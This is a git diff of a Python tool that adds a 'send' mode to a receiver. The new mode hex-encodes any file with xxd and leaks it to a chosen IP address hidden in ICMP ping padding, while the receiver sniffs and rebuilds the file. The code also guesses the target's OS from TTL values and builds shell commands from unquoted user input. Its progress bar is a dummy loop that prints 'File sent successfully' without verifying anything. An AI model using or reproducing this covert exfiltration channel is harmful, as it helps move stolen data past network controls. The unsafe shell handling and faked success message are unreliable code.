@@ -5,6 +5,9 @@ import signal
 import subprocess
 import sys
 import time
+import re
+from tqdm import tqdm
+import ipaddress
 
 
 def ctrl_c(signum, frame):
@@ -27,37 +30,178 @@ def get_colours(text, color):
         print(red_color)
 
 
+def menu_panel():
+    get_colours(f"\n[{Fore.RED + '!'}{Fore.GREEN + ''}] Usage: sudo python3 " + sys.argv[0] + "-i <Adaptor name / IP "
+                                                                                              "Address> -m <Mode> -f "
+                                                                                              "<Filename>", "green")
+    get_colours("――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――", 'red')
+    print(f"\n{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-i]'}{Fore.YELLOW + ' Network Adaptor name'}")
+    print("")
+    print(f"{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-m]'}{Fore.YELLOW + ' Mode to use'}")
+    print("")
+    get_colours(f"\t send", "blue")
+    get_colours(f"\t recv", "blue")
+    print("")
+    print(f"{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-f]'}{Fore.YELLOW + ' File name to save data or to send.'}")
+    print("")
+    print(f"{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-h]'}{Fore.YELLOW + ' Help Panel'}")
+    print(Fore.WHITE)  # To avoid leaving the terminal with colors.
+
+
 def data_parser(packet_info):
     if packet_info.haslayer(ICMP):
         if packet_info[ICMP].type == 8:
             byte_data = packet_info['ICMP'].load[-4:].decode('utf-8', errors="backslashreplace")
-            a = open(f'{sys.argv[2]}.txt', 'a')
+            a = open(f'{sys.argv[6]}.txt', 'a')
             a.write(byte_data)
             a.close()
             print(byte_data, flush=True, end='')
 
 
-if len(sys.argv) != 3:
-    print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + ''}]"
-          f"{Fore.YELLOW + f' Usage {sys.argv[0]} <Interface-Name> <File-name to save data>'}")
-else:
-    check_interface = subprocess.check_output("ip a | grep '%s' | awk '{print $2}' | grep"
-                                              " '%s' | awk '{print $1}' FS=':'" % (
-                                                  sys.argv[1], sys.argv[1]),
-                                              shell=True).decode().strip()
-    if sys.argv[1] != check_interface:
+def send_file(ip_address, file_name):
+    file_load = f"""xxd -p -c 4 {file_name} | while read line; do ping -c 1 -p $line {ip_address}; done >/dev/null 2>&1"""
+    print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
+          f"{Fore.BLUE + '  Trying to send file..'}")
+    check_output = subprocess.run([file_load], shell=True, capture_output=True, text=True)
+    if 'No such file or directory' in str(check_output):
         print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + ''}]"
-              f"{Fore.RED + '  No such interface'}")
+              f"{Fore.RED + ' Indicate file not found, check file name.'}")
+        print(Fore.WHITE)  # To avoid leaving the terminal with colours.
+    else:
+        get_file_length = 0
+        with open(f"{sys.argv[6]}", "r") as f:
+            get_file_length = len(f.readlines())
+        progess_bar = 0
+        print()
+        for i in tqdm(range(get_file_length * 10000)):
+            progess_bar += i
+        print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
+              f"{Fore.BLUE + '  File sent successfully'}")
         print(Fore.WHITE)
-        exit()
-    elif os.getuid() != 0:
+
+
+def check_permisson():
+    if os.getuid() != 0:
         print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + ''}]"
               f"{Fore.RED + ' Run this script with administrator privileges.'}")
         exit()
+    if sys.argv[4] == 'recv':
+        check_interface_exist = subprocess.check_output(
+            "ip a | grep '%s' | awk '{print $2}' | grep"
+            " '%s' | awk '{print $1}' FS=':'" % (
+                sys.argv[2], sys.argv[2]),
+            shell=True).decode().strip()
+
+        if sys.argv[2] != check_interface_exist:
+            print(
+                f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
+                f"{Fore.YELLOW + 'Invalid Network Interface name'}")
+            get_inters = subprocess.check_output("ls /sys/class/net",
+                                                 shell=True).decode().strip()
+            save_all = get_inters.split('\n')
+            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + ' Available interfaces are:'}\n")
+            cnt = 1
+            for i in save_all:
+                print(
+                    f"{Fore.RED + '┃'} {Fore.BLUE + str(cnt)}.{Fore.YELLOW + f' {i}'}")
+                cnt = cnt + 1
+            exit()
+        else:
+            print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
+                  f"{Fore.BLUE + '  Listening for any incoming connections...'}")
+            print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
+                  f"{Fore.BLUE + '  Saving data to file'}")
+            print(Fore.WHITE)  # To avoid leaving the terminal with colors.
+            sniff(iface=f'{sys.argv[2]}', prn=data_parser)
+    elif sys.argv[4] == 'send':
+        # check for the ip address.
+        try:
+            ipaddress.ip_address(sys.argv[2])
+        except ValueError:
+            print(
+                f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
+                f"{Fore.YELLOW + 'Invalid IP-Address.'}")
+            exit()
+
+        scan_host = subprocess.run([f"timeout 1 ping -c 1 {sys.argv[2]}"], stdout=subprocess.PIPE, shell=True)
+        split_ttl = str(scan_host).split()
+        try:
+            get_ttl_size = split_ttl[18]
+            ttl_value = re.findall(r"\d{1,3}", get_ttl_size)[0]
+            if "returncode=0" in str(scan_host):
+                if int(ttl_value) >= 0 and int(ttl_value) <= 64:
+                    print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
+                          f"{Fore.BLUE + '  Hosts active,'} {Fore.YELLOW + ' Linux system'}")
+                elif int(ttl_value) >= 65 and int(ttl_value) <= 128:
+                    print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
+                          f"{Fore.BLUE + '  Hosts active,'} {Fore.YELLOW + ' Windows system'}")
+            send_file(sys.argv[2], sys.argv[6])
+        except IndexError:
+            print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + ''}]"
+                  f"{Fore.RED + ' Host is not active.'}")
+
+
+def check_parms():
+    if len(sys.argv) > 1:
+        if sys.argv[1] == "-h":
+            menu_panel()
+        elif sys.argv[1] == '-i':
+            if len(sys.argv) > 2:
+                if len(sys.argv) > 3:
+                    if sys.argv[3] == '-m':
+                        if len(sys.argv) > 4:
+                            if len(sys.argv) > 5:
+                                if sys.argv[5] == '-f':
+                                    if len(sys.argv) > 6:
+                                        check_mode = ["send", "recv", ]
+                                        if sys.argv[4] not in check_mode:
+                                            print(
+                                                f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
+                                                f"{Fore.YELLOW + 'Select a valid Mode: '}")
+                                            print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + '1. send'}")
+                                            print(f"{Fore.RED + '┃'} {Fore.YELLOW + '2. recv'}")
+                                            print(Fore.WHITE)
+                                        else:
+                                            check_permisson()  # check for the admin privs
+                                    else:
+                                        print(
+                                            f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
+                                            f"{Fore.YELLOW + 'Missing Filename.'}")
+                            else:
+                                print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
+                                      f"{Fore.YELLOW + 'Missing the [-f] parameter.'}")
+                        else:
+                            print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
+                                  f"{Fore.YELLOW + 'Select a valid Mode: '}")
+                            print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + '1. send'}")
+                            print(f"{Fore.RED + '┃'} {Fore.YELLOW + '2. recv'}")
+                            print(Fore.WHITE)
+                    else:
+                        print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
+                              f"{Fore.YELLOW + 'Missing the [-m] parameter.'}")
+                        print(Fore.WHITE)
+                else:
+                    print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
+                          f"{Fore.YELLOW + 'Select a valid Mode: '}")
+                    print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + '1. send'}")
+                    print(f"{Fore.RED + '┃'} {Fore.YELLOW + '2. recv'}")
+                    print(Fore.WHITE)
+            else:
+                print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
+                      f"{Fore.YELLOW + 'Invalid Network Interface name'}")
+                get_inters = subprocess.check_output("ls /sys/class/net", shell=True).decode().strip()
+                save_all = get_inters.split('\n')
+                print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + ' Available interfaces are:'}\n")
+                cnt = 1
+                for i in save_all:
+                    print(f"{Fore.RED + '┃'} {Fore.BLUE + str(cnt)}.{Fore.YELLOW + f' {i}'}")
+                    cnt = cnt + 1
+                print(Fore.WHITE)
+        else:
+            print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
+                  f"{Fore.YELLOW + 'Missing the [-i] parameter.'}")
     else:
-        print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
-              f"{Fore.BLUE + '  Listening for any incoming connections...'}")
-        print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
-              f"{Fore.BLUE + '  Saving data to file'}")
-        print(Fore.WHITE)  # To avoid leaving the terminal with colors.
-        sniff(iface=f'{sys.argv[1]}', prn=data_parser)
+        menu_panel()
+
+
+check_parms()
